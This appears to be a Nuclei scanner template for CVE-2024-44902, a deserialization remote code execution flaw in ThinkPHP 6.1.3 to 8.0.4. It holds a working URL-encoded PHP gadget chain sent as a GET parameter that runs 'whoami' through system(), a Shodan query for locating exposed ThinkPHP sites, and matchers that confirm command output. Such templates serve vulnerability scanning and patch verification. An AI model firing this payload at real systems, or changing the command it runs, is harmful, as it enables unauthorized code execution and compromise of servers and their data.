id: CVE-2024-44902

info:
  name: ThinkPHP v6.1.3-v8.0.4 - Deserialization RCE
  author: AhmedZrouqui
  severity: critical
  description: |
    ThinkPHP v6.1.3 to v8.0.4 allows attackers to execute arbitrary code via insecure deserialization in the Memcached extension.
  reference:
    - https://github.com/fru1ts/CVE-2024-44902
    - https://nvd.nist.gov/vuln/detail/cve-2024-44902
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2024-44902
    cwe-id: CWE-502
  metadata:
    max-request: 1
    shodan-query: http.title:"thinkphp"
  tags: cve,cve2024,thinkphp,rce,deserialization

http:
  - method: GET
    path:
      - "{{BaseURL}}/index.php?x={{payload}}"

    payloads:
      payload:
        - "O%3A29%3A%22think%5Croute%5CResourceRegister%22%3A2%3A%7Bs%3A13%3A%22%00%2A%00registered%22%3Bb%3A0%3Bs%3A11%3A%22%00%2A%00resource%22%3BO%3A15%3A%22think%5CDbManager%22%3A2%3A%7Bs%3A11%3A%22%00%2A%00instance%22%3Ba%3A0%3A%7B%7Ds%3A9%3A%22%00%2A%00config%22%3Ba%3A2%3A%7Bs%3A11%3A%22connections%22%3Ba%3A1%3A%7Bs%3A7%3A%22getRule%22%3Ba%3A2%3A%7Bs%3A4%3A%22type%22%3Bs%3A29%3A%22%5Cthink%5Ccache%5Cdriver%5CMemcached%22%3Bs%3A8%3A%22username%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A3%3A%7Bs%3A12%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22fru1ts%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A16%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22fru1ts%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7D%7D%7Ds%3A7%3A%22default%22%3Bs%3A7%3A%22getRule%22%3B%7D%7D%7D"

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "(nt authority\\\\system|root|uid=[0-9]+|www-data)"

      - type: status
        status:
          - 200
